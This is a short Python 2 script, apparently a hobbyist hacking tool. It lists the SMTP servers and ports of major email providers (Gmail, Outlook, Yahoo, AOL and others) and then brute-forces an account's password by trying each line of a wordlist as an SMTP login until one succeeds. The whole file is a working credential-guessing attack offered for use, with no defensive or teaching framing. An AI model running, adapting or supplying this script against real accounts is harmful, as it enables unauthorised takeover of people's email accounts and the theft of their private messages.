
#!/usr/bin/python
#
#

import smtplib
import os

print """
#######################################################
Host                Server                         Port
#######################################################
1&1(1and1)..........smtp.1and1.com..................587
1&1 Deutschland.....smtp.1und1.de...................587
AOL.com.............smtp.aol.com....................587
AT&T................smtp.att.yahoo.com..............465
BT Connect..........smtp.btconnect.com..............25
Gmail.com...........smtp.gmail.com..................587
GMX.com.............smtp.gmx.com....................465
Mail.com............smtp.mail.com...................587
NTL@ntlworld.com....smtp.ntlworld.com...............465
O2 Deutschland......mail.o2online.de................25
Office365.com.......smtp.office365.com..............587
Outlook.com.........smtp-mail.outlook.com...........587
Sprint PCs..........smtp.sprintpcs.com..............25
Verizon.............outgoing.verizon.net............587
Yahoo Mail..........smtp.mail.yahoo.com.............465
Yahoo Mail Plus.....plus.smtp.mail.yahoo.com........465
Zoho Mail...........smtp.zoho.com...................465
#######################################################
"""

print "\n[!]...Please enter the SMTP-server"
server = raw_input("\n> ")
print "\n[!]...Please enter the smtp server port"
port = raw_input("\n> ")

print "\n[!]...Connecting, Please Wait"
smtpserver = smtplib.SMTP(server, port)
smtpserver.ehlo()
smtpserver.starttls()
print "\n[+]...Success, You're Connected to '%s:%s'" % (server, port)

print """
##################################
[!]...Enter one of the following
##################################
User-Name
Email-Address
Phone-Number
##################################
"""
user = raw_input("> ")

print "\n###########################################"
print "[!]...Please enter the path to a worldlist."
dirpath = os.getcwd()
print ("\ncurrent directory is:\n" + dirpath)
print "###########################################"

passwfile = raw_input("\n> ")

passwfile = open(passwfile, "r")
for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+]...password found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "\n[!]...password incorrect: %s" % password
